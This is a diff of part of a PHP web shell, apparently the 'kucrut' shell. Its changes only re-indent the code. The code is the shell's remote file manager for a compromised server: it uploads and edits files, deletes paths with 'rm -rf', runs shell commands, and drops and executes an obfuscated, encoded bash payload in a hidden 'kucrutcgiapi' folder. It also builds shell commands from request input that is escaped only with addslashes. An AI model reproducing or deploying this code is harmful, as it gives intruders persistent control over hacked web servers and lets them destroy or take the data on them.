-	return '<span>Theme: </span><select class="ace-controler ace-theme-selector" base="'.$base.'" onChange="kucrutAceChangeSetting(this,\'theme\');"><option value="terminal" selected>terminal</option><option value="ambiance">ambiance</option><option value="chaos">chaos</option><option value="chrome">chrome</option><option value="clouds">clouds</option><option value="clouds_midnight">clouds_midnight</option><option value="cobalt">cobalt</option><option value="crimson_editor">crimson_editor</option><option value="dawn">dawn</option><option value="dracula">dracula</option><option value="dreamweaver">dreamweaver</option><option value="eclipse">eclipse</option><option value="github">github</option><option value="gob">gob</option><option value="gruvbox">gruvbox</option><option value="idle_fingers">idle_fingers</option><option value="iplastic">iplastic</option><option value="katzenmilch">katzenmilch</option><option value="kr_theme">kr_theme</option><option value="kuroir">kuroir</option><option value="merbivore">merbivore</option><option value="merbivore_soft">merbivore_soft</option><option value="mono_industrial">mono_industrial</option><option value="monokai">monokai</option><option value="nord_dark">nord_dark</option><option value="pastel_on_dark">pastel_on_dark</option><option value="solarized_dark">solarized_dark</option><option value="solarized_light">solarized_light</option><option value="sqlserver">sqlserver</option><option value="textmate">textmate</option><option value="tomorrow">tomorrow</option><option value="tomorrow_night">tomorrow_night</option><option value="tomorrow_night_blue">tomorrow_night_blue</option><option value="tomorrow_night_bright">tomorrow_night_bright</option><option value="tomorrow_night_eighties">tomorrow_night_eighties</option><option value="twilight">twilight</option><option value="vibrant_ink">vibrant_ink</option><option value="xcode">xcode</option></select><span>Language: </span><select class="ace-controler" base="'.$base.'" onChange="kucrutAceChangeSetting(this,\'lang\');"><option value="php">php</option><option value="python">python</option><option value="perl">perl</option><option value="c_cpp">c/c++</option><option value="csharp">c#</option><option value="ruby">ruby</option><option value="html">html</option><option value="javascript">javascript</option><option value="css">css</option><option value="xml">xml</option><option value="sql">sql</option><option value="swift">swift</option><option value="sh">bash</option><option value="lua">lua</option><option value="powershell">powershell</option><option value="jsp">jsp</option><option value="java">java</option><option value="json">json</option><option value="plain_text">plain_text</option></select><span>Soft Wrap: </span><input type="checkbox" name="wrapmode" class="ace-controler" onClick="kucrutAceChangeWrapMode(this,\''.$base.'\');" checked> | <span>Font Size: </span><button class="ace-controler" style="cursor:pointer;" onclick="kucrutAceChangeFontSize(\''.$base.'\',\'+\', this);return false;">+</button> | <button style="cursor:pointer;" class="ace-controler" onclick="kucrutAceChangeFontSize(\''.$base.'\', \'-\', this);return false;">-</button> | ';
+    return '<span>Theme: </span><select class="ace-controler ace-theme-selector" base="'.$base.'" onChange="kucrutAceChangeSetting(this,\'theme\');"><option value="terminal" selected>terminal</option><option value="ambiance">ambiance</option><option value="chaos">chaos</option><option value="chrome">chrome</option><option value="clouds">clouds</option><option value="clouds_midnight">clouds_midnight</option><option value="cobalt">cobalt</option><option value="crimson_editor">crimson_editor</option><option value="dawn">dawn</option><option value="dracula">dracula</option><option value="dreamweaver">dreamweaver</option><option value="eclipse">eclipse</option><option value="github">github</option><option value="gob">gob</option><option value="gruvbox">gruvbox</option><option value="idle_fingers">idle_fingers</option><option value="iplastic">iplastic</option><option value="katzenmilch">katzenmilch</option><option value="kr_theme">kr_theme</option><option value="kuroir">kuroir</option><option value="merbivore">merbivore</option><option value="merbivore_soft">merbivore_soft</option><option value="mono_industrial">mono_industrial</option><option value="monokai">monokai</option><option value="nord_dark">nord_dark</option><option value="pastel_on_dark">pastel_on_dark</option><option value="solarized_dark">solarized_dark</option><option value="solarized_light">solarized_light</option><option value="sqlserver">sqlserver</option><option value="textmate">textmate</option><option value="tomorrow">tomorrow</option><option value="tomorrow_night">tomorrow_night</option><option value="tomorrow_night_blue">tomorrow_night_blue</option><option value="tomorrow_night_bright">tomorrow_night_bright</option><option value="tomorrow_night_eighties">tomorrow_night_eighties</option><option value="twilight">twilight</option><option value="vibrant_ink">vibrant_ink</option><option value="xcode">xcode</option></select><span>Language: </span><select class="ace-controler" base="'.$base.'" onChange="kucrutAceChangeSetting(this,\'lang\');"><option value="php">php</option><option value="python">python</option><option value="perl">perl</option><option value="c_cpp">c/c++</option><option value="csharp">c#</option><option value="ruby">ruby</option><option value="html">html</option><option value="javascript">javascript</option><option value="css">css</option><option value="xml">xml</option><option value="sql">sql</option><option value="swift">swift</option><option value="sh">bash</option><option value="lua">lua</option><option value="powershell">powershell</option><option value="jsp">jsp</option><option value="java">java</option><option value="json">json</option><option value="plain_text">plain_text</option></select><span>Soft Wrap: </span><input type="checkbox" name="wrapmode" class="ace-controler" onClick="kucrutAceChangeWrapMode(this,\''.$base.'\');" checked> | <span>Font Size: </span><button class="ace-controler" style="cursor:pointer;" onclick="kucrutAceChangeFontSize(\''.$base.'\',\'+\', this);return false;">+</button> | <button style="cursor:pointer;" class="ace-controler" onclick="kucrutAceChangeFontSize(\''.$base.'\', \'-\', this);return false;">-</button> | ';
 }
 function kucrutFilesMan2(){
-	kucruthead();
-	KucrutNum(8,9,10,7,6,5,4);
-	echo '<div style="position:relative;" fm_id="1" id="filesman_holder_1" class="ajaxarea filesman-active-content"><div class="header"></div></div>';
-	kucrutFooter();
+    kucruthead();
+    KucrutNum(8,9,10,7,6,5,4);
+    echo '<div style="position:relative;" fm_id="1" id="filesman_holder_1" class="ajaxarea filesman-active-content"><div class="header"></div></div>';
+    kucrutFooter();
 }
 function copy_paste($c,$s,$d){
 if(@is_dir($c.$s)){
@@ -2893,34 +2893,34 @@ case 'uploadFile':
 $move_cmd_file = false;
 $kucrut_canruncmd = false;
 if($GLOBALS['glob_chdir_false']){
-	$kucrut_canruncmd = _kucrut_can_runCommand(true,true);
-	$move_cmd_file = true;
+    $kucrut_canruncmd = _kucrut_can_runCommand(true,true);
+    $move_cmd_file = true;
 }
 if(_kucrut_is_writable($GLOBALS['cwd'])){
 $files = reArrayFiles($_FILES['f']);
 $ret_files = array();
 foreach($files as $file){
 if($move_cmd_file&&$kucrut_canruncmd){
-	kucrutEx("cat '".addslashes($file['tmp_name'])."' > '".addslashes($_POST["c"]."/".$file['name'])."'");
+    kucrutEx("cat '".addslashes($file['tmp_name'])."' > '".addslashes($_POST["c"]."/".$file['name'])."'");
 }else{
-	if(@move_uploaded_file($file['tmp_name'],$file['name'])){
-		$ow = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($file['name'])):array("name" => "????");
-		$gr = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($file['name'])):array("name" => "????");
-		$file_owner = $ow['name']?$ow['name']:(function_exists("fileowner")?@fileowner($file['name']):"????");
-		$file_group = $gr['name']?$gr['name']:(function_exists("filegroup")?@filegroup($file['name']):"????");
-		$file_modify = @date('Y-m-d H:i:s', @filemtime($file['name']));
-		$file_perm = kucrutPermsColor($file['name']);
-		$file_size = @filesize($file['name']);
-		$ret_files[] = array("name" => $file['name'], "size" => kucrutSize($file_size), "perm" => $file_perm, "modify" => $file_modify, "owner" => $file_owner."/".$file_group);
-	}
+    if(@move_uploaded_file($file['tmp_name'],$file['name'])){
+        $ow = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($file['name'])):array("name" => "????");
+        $gr = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($file['name'])):array("name" => "????");
+        $file_owner = $ow['name']?$ow['name']:(function_exists("fileowner")?@fileowner($file['name']):"????");
+        $file_group = $gr['name']?$gr['name']:(function_exists("filegroup")?@filegroup($file['name']):"????");
+        $file_modify = @date('Y-m-d H:i:s', @filemtime($file['name']));
+        $file_perm = kucrutPermsColor($file['name']);
+        $file_size = @filesize($file['name']);
+        $ret_files[] = array("name" => $file['name'], "size" => kucrutSize($file_size), "perm" => $file_perm, "modify" => $file_modify, "owner" => $file_owner."/".$file_group);
+    }
 }
 }
 if(!$move_cmd_file){
-	echo json_encode($ret_files);
+    echo json_encode($ret_files);
 }
 }else{
-	echo "noperm";
-	return;
+    echo "noperm";
+    return;
 }
 if(!$move_cmd_file){
 return;
@@ -2929,34 +2929,34 @@ break;
 case 'mkdir':
 $new_dir_cmd = false;
 if($GLOBALS['glob_chdir_false']){
-	if(_kucrut_can_runCommand(true,true)){
-		if(_kucrut_is_writable($GLOBALS['cwd'])){
-			if(!_kucrut_is_dir(trim($_POST['kucrut2']))){
-				kucrutEx("cd '".trim(addslashes($_POST['c']))."';mkdir '".trim(addslashes($_POST['kucrut2']))."'");
-				echo "<script>kucrutShowNotification('".addslashes($_POST['kucrut2'])." created...', 'Files manager');</script>";
-			}else{
-				echo "<script>kucrutShowNotification('folder already existed', 'Files manager', 'error');</script>";
-			}
-		}else{
-			echo "<script>kucrutShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
-		}
-	}else{
-		echo "<script>kucrutShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
-	}
+    if(_kucrut_can_runCommand(true,true)){
+        if(_kucrut_is_writable($GLOBALS['cwd'])){
+            if(!_kucrut_is_dir(trim($_POST['kucrut2']))){
+                kucrutEx("cd '".trim(addslashes($_POST['c']))."';mkdir '".trim(addslashes($_POST['kucrut2']))."'");
+                echo "<script>kucrutShowNotification('".addslashes($_POST['kucrut2'])." created...', 'Files manager');</script>";
+            }else{
+                echo "<script>kucrutShowNotification('folder already existed', 'Files manager', 'error');</script>";
+            }
+        }else{
+            echo "<script>kucrutShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
+        }
+    }else{
+        echo "<script>kucrutShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
+    }
 }else{
-	if(_kucrut_is_writable($GLOBALS['cwd'])){
-		if(!_kucrut_is_dir(trim($_POST['kucrut2']))){
-			if(!@mkdir(trim($_POST['kucrut2']))){
-				echo "<script>kucrutShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
-			}else{
-				echo "<script>kucrutShowNotification('".addslashes($_POST['kucrut2'])." created...', 'Files manager');</script>";
-			}
-		}else{
-			echo "<script>kucrutShowNotification('folder already existed', 'Files manager', 'error');</script>";
-		}
-	}else{
-		echo "<script>kucrutShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
-	}
+    if(_kucrut_is_writable($GLOBALS['cwd'])){
+        if(!_kucrut_is_dir(trim($_POST['kucrut2']))){
+            if(!@mkdir(trim($_POST['kucrut2']))){
+                echo "<script>kucrutShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
+            }else{
+                echo "<script>kucrutShowNotification('".addslashes($_POST['kucrut2'])." created...', 'Files manager');</script>";
+            }
+        }else{
+            echo "<script>kucrutShowNotification('folder already existed', 'Files manager', 'error');</script>";
+        }
+    }else{
+        echo "<script>kucrutShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
+    }
 }
 break;
 case 'delete':
@@ -2982,9 +2982,9 @@ if($f == '..')
 continue;
 $f = rawurldecode($f);
 if($GLOBALS["glob_chdir_false"]){
-	if(_kucrut_can_runCommand(true,true)){
-		kucrutEx("rm -rf '".addslashes($_POST['c'].'/'.$f)."'");
-	}
+    if(_kucrut_can_runCommand(true,true)){
+        kucrutEx("rm -rf '".addslashes($_POST['c'].'/'.$f)."'");
+    }
 }else{
 kucrutEx("rm -rf '".addslashes($f)."'",false,false);
 if(@is_dir($f))
@@ -3000,12 +3000,12 @@ kucrutEx("rm -rf '".addslashes($_POST['kucrut2'])."'",false,false);
 @unlink(rawurldecode(@$_POST['kucrut2']));
 }
 if($GLOBALS["glob_chdir_false"]){
-	$source = rawurldecode(@$_POST['kucrut2']);
-	if($source!='..'&&!empty($source)){
-		if(_kucrut_can_runCommand(true,true)){
-			kucrutEx("cd '".trim(addslashes($_POST['c']))."';rm -rf '".addslashes($source)."'");
-		}
-	}
+    $source = rawurldecode(@$_POST['kucrut2']);
+    if($source!='..'&&!empty($source)){
+        if(_kucrut_can_runCommand(true,true)){
+            kucrutEx("cd '".trim(addslashes($_POST['c']))."';rm -rf '".addslashes($source)."'");
+        }
+    }
 }
 if(is_array($_POST['f']))
 return;
@@ -3070,36 +3070,36 @@ break;
 }
 $dirContent = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
 if(preg_match("#(.*)\/\.\.#", $_POST['c'], $res)){
-	$path = explode('/', $res[1]);
-	array_pop($path);
-	$_POST['c'] = implode('/', $path);
+    $path = explode('/', $res[1]);
+    array_pop($path);
+    $_POST['c'] = implode('/', $path);
 }
 $cmd_dir = false;
 if($dirContent === false){
-	if(_kucrut_can_runCommand(true,true)){
-		$tmp_getdir_path = @$_COOKIE["kucrutchdir_bash_path"];
-		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
-		if(!isset($_COOKIE["kucrutchdir_bash"])||@!file_exists($tmp_getdir_path."/kucrutcgiapi/getdir.kucrut")){
-			$bash = "jZTfb5swEMef4a+4uaYkSmmS/YpEwsOkqVNfO+1hSqKKggnWwI4MEaFppL3vv9xfUtsYSKpMWh6I7/O9O9vcHVfvxrtCjJ8oGxep/fX+IcBT+/7ue4DdFXNtEqUc0BLZCRdAgTLAg6wALwQsfYdziLkN8rcNyzRAio0xRRrRBJZLwBSCANDtLYLra/D2Mr5KaZSCIGGcUfZrCOv1HMqUMB3VJcOD1gO8BLBiw86DBhpoO6G2RVnCZURRhiV4ESDnznd++M433yl856c/cULf+YLaLJa6n+u7+gzgCXWdUIiwhsViAQirbMi2ynpLAnzQynKyPurdeMWI6OjU0I3gu21H30tqFfS5j/6gSM5jmtQd+2hit0TkbJd3/NMJT3d5yDrls1EYqR571XWb1yALNBgApcFkLp8LfLjqfI6KjEYw7Av2JstIFu/QWT6m1J8e//7+05Qy5oy8PdNZuKxAU21zGV3zyXQ2m6G+vJbVXhVNlGJAkw/FQm5X7eVDVPKxF5V00LXVmb1KFkaVTyVUraSYOGFnm0Q84yJAeUjZ40YQwvRRZUKSmXT/FSo7tSR9aEEu+AgStx79abHqHf0SYipIVHJRn22kW0tpJ0fqYwTZ7LJQyM7OiL7uy8tlB5Jvy/rfbkWdP/GMRqCm6ML+OrA5tp7zwwqxMCcr5MNKTsEK3ch/5WpIs1RQT4GhZq2wHgODzVphNQqGNksFm2kwuDWUYJrEKJ3VSrpdTkRjt7IuzYls7OONrZu4+Z4djmv0Cg==";
-			$tmp_getdir_path = kucrutWriteTocgiapi("getdir.kucrut",$bash);
-			__kucrut_set_cookie("kucrutchdir_bash", "true");
-			__kucrut_set_cookie("kucrutchdir_bash_path", $tmp_getdir_path);
-		}
-		$dirContent = kucrutEx("cd ".$tmp_getdir_path."/kucrutcgiapi;sh getdir.kucrut '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
-		$dirContent = json_decode($dirContent, true);
-		if(is_array($dirContent)){
-			array_pop($dirContent);
-			$cmd_dir = true;
-		}else{
-			$dirContent = false;
-		}
-	}
+    if(_kucrut_can_runCommand(true,true)){
+        $tmp_getdir_path = @$_COOKIE["kucrutchdir_bash_path"];
+        @chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
+        if(!isset($_COOKIE["kucrutchdir_bash"])||@!file_exists($tmp_getdir_path."/kucrutcgiapi/getdir.kucrut")){
+            $bash = "jZTfb5swEMef4a+4uaYkSmmS/YpEwsOkqVNfO+1hSqKKggnWwI4MEaFppL3vv9xfUtsYSKpMWh6I7/O9O9vcHVfvxrtCjJ8oGxep/fX+IcBT+/7ue4DdFXNtEqUc0BLZCRdAgTLAg6wALwQsfYdziLkN8rcNyzRAio0xRRrRBJZLwBSCANDtLYLra/D2Mr5KaZSCIGGcUfZrCOv1HMqUMB3VJcOD1gO8BLBiw86DBhpoO6G2RVnCZURRhiV4ESDnznd++M433yl856c/cULf+YLaLJa6n+u7+gzgCXWdUIiwhsViAQirbMi2ynpLAnzQynKyPurdeMWI6OjU0I3gu21H30tqFfS5j/6gSM5jmtQd+2hit0TkbJd3/NMJT3d5yDrls1EYqR571XWb1yALNBgApcFkLp8LfLjqfI6KjEYw7Av2JstIFu/QWT6m1J8e//7+05Qy5oy8PdNZuKxAU21zGV3zyXQ2m6G+vJbVXhVNlGJAkw/FQm5X7eVDVPKxF5V00LXVmb1KFkaVTyVUraSYOGFnm0Q84yJAeUjZ40YQwvRRZUKSmXT/FSo7tSR9aEEu+AgStx79abHqHf0SYipIVHJRn22kW0tpJ0fqYwTZ7LJQyM7OiL7uy8tlB5Jvy/rfbkWdP/GMRqCm6ML+OrA5tp7zwwqxMCcr5MNKTsEK3ch/5WpIs1RQT4GhZq2wHgODzVphNQqGNksFm2kwuDWUYJrEKJ3VSrpdTkRjt7IuzYls7OONrZu4+Z4djmv0Cg==";
+            $tmp_getdir_path = kucrutWriteTocgiapi("getdir.kucrut",$bash);
+            __kucrut_set_cookie("kucrutchdir_bash", "true");
+            __kucrut_set_cookie("kucrutchdir_bash_path", $tmp_getdir_path);
+        }
+        $dirContent = kucrutEx("cd ".$tmp_getdir_path."/kucrutcgiapi;sh getdir.kucrut '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
+        $dirContent = json_decode($dirContent, true);
+        if(is_array($dirContent)){
+            array_pop($dirContent);
+            $cmd_dir = true;
+        }else{
+            $dirContent = false;
+        }
+    }
 }
 kucruthead();
 KucrutNum(8,9,10,7,6,5,4);
 $count_dirContent = @count($dirContent);
 if($count_dirContent > 300){
-	@$_COOKIE["kucrut_limited_files"] = 100;
+    @$_COOKIE["kucrut_limited_files"] = 100;
 }
 $kucrut_sort_by = isset($_COOKIE["kucrut_sort_by"]) ? $_COOKIE["kucrut_sort_by"] : 'name';
 $kucrut_limited_files = isset($_COOKIE["kucrut_limited_files"]) ? (int)$_COOKIE["kucrut_limited_files"] : 0;
@@ -3107,10 +3107,10 @@ $kucrut_files_page_number = isset($_POST["pagenum"]) ? (int)$_POST["pagenum"] : 
 $kucrut_filesman_direction = isset($_COOKIE["kucrut_filesman_direction"]) ? $_COOKIE["kucrut_filesman_direction"] : 'asc';
 $files_page_count = 1;
 if($kucrut_limited_files > 0){
-	$files_page_count = ceil($count_dirContent/$kucrut_limited_files);
-	if($files_page_count > 1){
-		$files_page_count++;
-	}
+    $files_page_count = ceil($count_dirContent/$kucrut_limited_files);
+    if($files_page_count > 1){
+        $files_page_count++;
+    }
 }
 echo '<div><div class="filters-holder"><span>Filter: </span><input style="color:#25ff00;" autocomplete="off" type="text" id="regex-filter" name="name-filter" onkeydown="doFilterName(this);"><span style="margin-left:10px">Sort By: </span><select name="sort_files" onchange="sortBySelectedValue(this,\'kucrut_sort_by\');" style="color:#25ff00;"><option value="name" '.($kucrut_sort_by == 'name'?'selected':'').'>Name</option><option value="size" '.($kucrut_sort_by == 'size'?'selected':'').'>Size</option><option value="modify" '.($kucrut_sort_by == 'modify'?'selected':'').'>Modify</option></select><span style="margin-left:10px">Direction: </span><select name="direction_filesman" onChange="sortBySelectedValue(this,\'kucrut_filesman_direction\')" style="color:#25ff00;"><option value="asc" '.($kucrut_filesman_direction == 'asc'?'selected':'').'>Ascending</option><option value="desc" '.($kucrut_filesman_direction == 'desc'?'selected':'').'>Descending</option></select><span style="margin-left:10px;"> limit: </span><input style="text-align:center;width: 40px;color:#25ff00;" type="text" name="limited_number" value="'.$kucrut_limited_files.'" oninput="this.value=this.value.replace(/[^0-9]/g,\'\');setCookie(\'kucrut_limited_files\', this.value, 2012);"><span style="margin-left:10px;">Files Count: <b style="color:#25ff00;">'.($count_dirContent-1).'</b></span></div><div class="header">';
 if($dirContent == false){
@@ -3121,28 +3121,28 @@ return;
 global $sort;
 $sort = array('name', 1);
 if(isset($_COOKIE["kucrut_sort_by"]) && !empty($_COOKIE["kucrut_sort_by"])){
-	$sort[0] = $_COOKIE["kucrut_sort_by"];
+    $sort[0] = $_COOKIE["kucrut_sort_by"];
 }
 if(!empty($_POST['kucrut1'])) {
 if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['kucrut1'], $match))
 $sort = array($match[1], (int)$match[2]);
 }
 if($kucrut_files_page_number > ($files_page_count-1)){
-	$kucrut_files_page_number = 1;
+    $kucrut_files_page_number = 1;
 }
 $checkbox_rand = rand(11111, 99999);
 echo "<form onsubmit='fc(this);return false;' name='files' method='post'><table id='filemanager_table' width='100%' class='main' cellspacing='0' cellpadding='2'><tr><th width='13px'><div class='myCheckbox' style='padding-left:0px;'><input type='checkbox' id='mchk".$checkbox_rand."' onclick='checkBox(this);' class='chkbx'><label for='mchk".$checkbox_rand."'></label></div></th><th>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>";
 $dirs = $files = array();
 $n = $count_dirContent;
 if($n > $kucrut_limited_files && $kucrut_limited_files > 0){
-	$n = ($kucrut_limited_files * $kucrut_files_page_number);
-	if($n > $count_dirContent){
-		$n = $count_dirContent;
-	}
+    $n = ($kucrut_limited_files * $kucrut_files_page_number);
+    if($n > $count_dirContent){
+        $n = $count_dirContent;
+    }
 }
 $i = 0;
 if($kucrut_limited_files > 0 && $kucrut_files_page_number > 1){
-	$i = $kucrut_limited_files * ($kucrut_files_page_number - 1);
+    $i = $kucrut_limited_files * ($kucrut_files_page_number - 1);
 }
 $page_builder = get_pagination_links($kucrut_files_page_number,$files_page_count -1);
 $cmd_dir_backp = "";
@@ -3181,7 +3181,7 @@ $tmp = array('name' => $filename,
 'group' => $file_group
 );
 if($filename == ".." && !$cmd_dir){
-	$tmp["path"] = str_replace("\\", "/", realpath($file_path));
+    $tmp["path"] = str_replace("\\", "/", realpath($file_path));
 }
 if(!$cmd_dir){
 if(@is_file($file_path)){
@@ -3196,13 +3196,13 @@ $dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['pat
 $dirs[] = array_merge($tmp, array('type' => 'dir'));
 }
 }else{
-	if($dirContent[$i]["type"]=="file"){
-		$files[] = array_merge($tmp, array('type' => 'file'));
-	}else{
-		if($dirContent[$i]["name"] != "."){
-			$dirs[] = array_merge($tmp, array('type' => 'dir'));
-		}
-	}
+    if($dirContent[$i]["type"]=="file"){
+        $files[] = array_merge($tmp, array('type' => 'file'));
+    }else{
+        if($dirContent[$i]["name"] != "."){
+            $dirs[] = array_merge($tmp, array('type' => 'dir'));
+        }
+    }
 }
 }
 $GLOBALS['sort'] = $sort;
@@ -3215,10 +3215,10 @@ return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
 usort($files, "kucrutCmp");
 usort($dirs, "kucrutCmp");
 if(isset($_COOKIE["kucrut_filesman_direction"])&& !empty($_COOKIE["kucrut_filesman_direction"])){
-	if($_COOKIE["kucrut_filesman_direction"] == 'desc'){
-		$files = array_reverse($files);
-		$dirs = array_reverse($dirs);
-	}
+    if($_COOKIE["kucrut_filesman_direction"] == 'desc'){
+        $files = array_reverse($files);
+        $dirs = array_reverse($dirs);
+    }
 }
 $files = array_merge($dirs, $files);
 $l=0;
@@ -3247,31 +3247,31 @@ kucrutfooter();
 function get_pagination_links($current_page, $total_pages){
     $links = "";
     if ($total_pages >= 1 && $current_page <= $total_pages) {
-		$links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number\"><<</a>";
-		$selected_page = "";
-		if($current_page == 1){
-			$selected_page = " active-page-number";
-		}
+        $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number\"><<</a>";
+        $selected_page = "";
+        if($current_page == 1){
+            $selected_page = " active-page-number";
+        }
         $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$selected_page."\">1</a>";
         $i = max(2, $current_page - 5);
         if ($i > 2)
             $links .= "<a class=\"page-number\">...</a>";
         for (; $i < min($current_page + 6, $total_pages); $i++) {
-			if($i == $current_page){
-				$selected_page = " active-page-number";
-			}else{
-				$selected_page = "";
-			}
+            if($i == $current_page){
+                $selected_page = " active-page-number";
+            }else{
+                $selected_page = "";
+            }
             $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$selected_page."\">{$i}</a>";
         }
         if ($i != $total_pages)
             $links .= "<a class=\"page-number\">...</a>";
-		$selected_page = " last-page-number";
-		if($current_page == $total_pages){
-			$selected_page .= " active-page-number";
-		}
+        $selected_page = " last-page-number";
+        if($current_page == $total_pages){
+            $selected_page .= " active-page-number";
+        }
         $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$selected_page."\">{$total_pages}</a>";
-		$links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number\">>></a>";
+        $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number\">>></a>";
     }
     return $links;
 }
@@ -3282,41 +3282,41 @@ if(isset($_POST['kucrut1']))$_POST['kucrut1'] = rawurldecode($_POST['kucrut1']);
 $kucrut1_decoded = $_POST['kucrut1'];
 $chdir_fals = false;
 if(!@chdir($_POST['c'])){
-	$chdir_fals = true;
-	$_POST['kucrut1'] = $_POST["c"]."/".$_POST["kucrut1"];
-	$kucrut_canruncmd = _kucrut_can_runCommand(true,true);
-	if($kucrut_canruncmd){
-		$slashed_kucrut1 = addslashes($_POST['kucrut1']);
-		$file_info = explode(":", kucrutEx('stat -c "%F:%U:%G:%s:%Y:0%a:%A" "'.$slashed_kucrut1.'"'));
-		$perm_color_class = kucrutEx("if [[ -w '".$slashed_kucrut1."' ]]; then echo main_green_perm; elif [[ -r '".$slashed_kucrut1."' ]]; then echo main_white_perm; else echo main_red_perm; fi");
-	}
+    $chdir_fals = true;
+    $_POST['kucrut1'] = $_POST["c"]."/".$_POST["kucrut1"];
+    $kucrut_canruncmd = _kucrut_can_runCommand(true,true);
+    if($kucrut_canruncmd){
+        $slashed_kucrut1 = addslashes($_POST['kucrut1']);
+        $file_info = explode(":", kucrutEx('stat -c "%F:%U:%G:%s:%Y:0%a:%A" "'.$slashed_kucrut1.'"'));
+        $perm_color_class = kucrutEx("if [[ -w '".$slashed_kucrut1."' ]]; then echo main_green_perm; elif [[ -r '".$slashed_kucrut1."' ]]; then echo main_white_perm; else echo main_red_perm; fi");
+    }
 }
 if($_POST['kucrut2'] == 'auto'){
 if(is_array(@getimagesize($_POST['kucrut1']))){
 $_POST['kucrut2'] = 'image';
 }else{
-	$_POST['kucrut2'] = 'view';
-	if($chdir_fals){
-		if($kucrut_canruncmd){
-			$mime = explode(":", kucrutEx("file --mime-type '".addslashes($_POST['kucrut1'])."'"));
-			$mimetype = $mime[1];
-			if(!empty($mimetype)){
-				if(strstr($mimetype, "image")){
-					$_POST['kucrut2'] = 'image';
-				}
-			}
-		}
-	}
+    $_POST['kucrut2'] = 'view';
+    if($chdir_fals){
+        if($kucrut_canruncmd){
+            $mime = explode(":", kucrutEx("file --mime-type '".addslashes($_POST['kucrut1'])."'"));
+            $mimetype = $mime[1];
+            if(!empty($mimetype)){
+                if(strstr($mimetype, "image")){
+                    $_POST['kucrut2'] = 'image';
+                }
+            }
+        }
+    }
 }
 }
 if($_POST['kucrut2'] == "rename" && !empty($_POST['kucrut3']) && @is_writable($_POST['kucrut1'])){$rename_cache = $_POST['kucrut3'];}
 if(@$_POST['kucrut2'] == 'mkfile'){
 $_POST['kucrut1'] = trim($_POST['kucrut1']);
 if($chdir_fals&&$kucrut_canruncmd){
-	if(_kucrut_is_writable($_POST["c"])){
-		kucrutEx("cd '".addslashes($_POST["c"])."';touch '".addslashes($kucrut1_decoded)."'");
-		$_POST['kucrut2'] = "edit";
-	}
+    if(_kucrut_is_writable($_POST["c"])){
+        kucrutEx("cd '".addslashes($_POST["c"])."';touch '".addslashes($kucrut1_decoded)."'");
+        $_POST['kucrut2'] = "edit";
+    }
 }
 if(!@file_exists($_POST['kucrut1'])){
 $fp = @fopen($_POST['kucrut1'], 'w');
@@ -3348,15 +3348,15 @@ $gid['name'] = function_exists("filegroup")?@filegroup($_POST['kucrut1']):'';
 $permcolor = kucrutPermsColor($_POST['kucrut1']);
 $filesize = @filesize($_POST['kucrut1']);
 if(!isset($uid['name'],$gid['name'])||empty($uid['name'])||empty($gid['name'])){
-	if(_kucrut_can_runCommand()){
-		list($uid['name'],$gid['name']) = explode(":", kucrutEx('stat -c "%U:%G" "'.addslashes($_POST["c"]."/".$_POST["kucrut1"]).'"'));
-	}
+    if(_kucrut_can_runCommand()){
+        list($uid['name'],$gid['name']) = explode(":", kucrutEx('stat -c "%U:%G" "'.addslashes($_POST["c"]."/".$_POST["kucrut1"]).'"'));
+    }
 }
 }
 if(substr($_POST['kucrut1'], 0, 7) == "phar://"){
-	$kucrut_file_directory = $_POST['kucrut1'];
+    $kucrut_file_directory = $_POST['kucrut1'];
 }else{
-	$kucrut_file_directory = str_replace("//", "/",($chdir_fals?"":$_POST['c'].'/').$_POST['kucrut1']);
+    $kucrut_file_directory = str_replace("//", "/",($chdir_fals?"":$_POST['c'].'/').$_POST['kucrut1']);
 }
 echo '<div style="overflow: hidden;white-space: nowrap;text-overflow: ellipsis;"><span class="editor_file_info_vars">Name:</span> '.htmlspecialchars(basename($kucrut1_decoded)).' <span class="editor_file_info_vars">Size:</span> '.kucrutSize($filesize).' <span class="editor_file_info_vars">Permission:</span> '.$permcolor.' <span class="editor_file_info_vars">Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].' <span class="editor_file_info_vars">Directory:</span> '.dirname($kucrut_file_directory).'</div>';
 if(empty($_POST['kucrut2']))$_POST['kucrut2'] = 'view';
@@ -3384,12 +3384,12 @@ $_POST['kucrut3'] = substr($_POST['kucrut3'],1);
 $time = @filemtime($_POST['kucrut1']);
 $fp = @__write_file($_POST['kucrut1'],$_POST['kucrut3']);
 if($chdir_fals&&$kucrut_canruncmd){
-	$rname = $kucrut1_decoded;
-	$randname = $rname.rand(111,9999);
-	$filepath = dirname($_SERVER["SCRIPT_FILENAME"])."/".$randname;
-	if($fp = @__write_file($filepath ,$_POST['kucrut3'])){
